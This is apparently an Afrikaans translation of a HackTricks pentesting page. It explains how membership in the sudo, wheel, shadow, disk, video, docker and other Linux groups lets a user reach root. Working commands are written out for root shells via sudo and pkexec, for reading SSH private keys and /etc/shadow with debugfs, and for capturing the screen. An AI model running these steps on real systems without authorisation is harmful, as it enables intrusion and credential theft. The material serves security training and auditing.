{{#include ../../banners/hacktricks-training.md}}


# Sudo/Admin Groepe

## **PE - Metode 1**

**Soms**, **per standaard \(of omdat sommige sagteware dit benodig\)** binne die **/etc/sudoers** lêer kan jy sommige van hierdie lyne vind:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Dit beteken dat **enige gebruiker wat tot die groep sudo of admin behoort, enigiets as sudo kan uitvoer**.

As dit die geval is, om **root te word kan jy net uitvoer**:
```text
sudo su
```
## PE - Metode 2

Vind alle suid binaire en kyk of daar die binaire **Pkexec** is:
```bash
find / -perm -4000 2>/dev/null
```
As jy vind dat die binêre pkexec 'n SUID-binêre is en jy behoort tot sudo of admin, kan jy waarskynlik binêre uitvoer as sudo met behulp van pkexec. 
Kontroleer die inhoud van:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Daar sal jy vind watter groepe toegelaat word om **pkexec** uit te voer en **per standaard** kan sommige van die groepe **sudo of admin** **verskyn** in sommige linux.

Om **root te word kan jy uitvoer**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
As jy probeer om **pkexec** uit te voer en jy kry hierdie **fout**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Dit is nie omdat jy nie toestemmings het nie, maar omdat jy nie sonder 'n GUI gekonnekteer is nie**. En daar is 'n oplossing vir hierdie probleem hier: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Jy het **2 verskillende ssh-sessies** nodig:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
# Wheel Groep

**Soms**, **per standaard** binne die **/etc/sudoers** lêer kan jy hierdie lyn vind:
```text
%wheel	ALL=(ALL:ALL) ALL
```
Dit beteken dat **enige gebruiker wat tot die groep wheel behoort, enigiets as sudo kan uitvoer**.

As dit die geval is, om **root te word kan jy net uitvoer**:
```text
sudo su
```
# Shadow Group

Gebruikers van die **groep shadow** kan **lees** die **/etc/shadow** lêer:
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
So, lees die lêer en probeer om **sommige hashes te kraak**.

# Skyf Groep

Hierdie voorreg is byna **gelyk aan worteltoegang** aangesien jy toegang het tot al die data binne die masjien.

Lêers:`/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Let daarop dat jy met debugfs ook **lêers kan skryf**. Byvoorbeeld, om `/tmp/asd1.txt` na `/tmp/asd2.txt` te kopieer, kan jy doen:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
However, if you try to **write files owned by root** \(like `/etc/shadow` or `/etc/passwd`\) you will have a "**Permission denied**" error.

# Video Group

Using the command `w` you can find **who is logged on the system** and it will show an output like the following one:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Die **tty1** beteken dat die gebruiker **yossi fisies ingelogde** is op 'n terminal op die masjien.

Die **video groep** het toegang om die skermuitset te sien. Basies kan jy die skerms observeer. Om dit te doen, moet jy die **huidige beeld op die skerm gryp** in rou data en die resolusie wat die skerm gebruik, kry. Die skermdata kan gestoor word in `/dev/fb0` en jy kan die resolusie van hierdie skerm vind op `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Om die **rauwe beeld** te **open**, kan jy **GIMP** gebruik, kies die **`screen.raw`** lêer en kies as lêertipe **Raw image data**:

![](../../images/image%20%28208%29.png)

Verander dan die Breedte en Hoogte na die waardes wat op die skerm gebruik word en kyk na verskillende Beeldtipes \(en kies die een wat die skerm beter vertoon\):

![](../../images/image%20%28295%29.png)

# Root Groep

Dit lyk of **lede van die root groep** standaard toegang kan hê om sommige **diens** konfigurasielêers of sommige **biblioteek** lêers of **ander interessante dinge** wat gebruik kan word om voorregte te verhoog, te **wysig**...

**Kontroleer watter lêers root lede kan wysig**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Docker Groep

Jy kan die wortel lêersisteem van die gasheer masjien aan 'n instansie se volume monteer, sodat wanneer die instansie begin, dit onmiddellik 'n `chroot` in daardie volume laai. Dit gee jou effektief wortel op die masjien.

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

# lxc/lxd Groep

[lxc - Privilege Escalation](lxd-privilege-escalation.md)


{{#include ../../banners/hacktricks-training.md}}
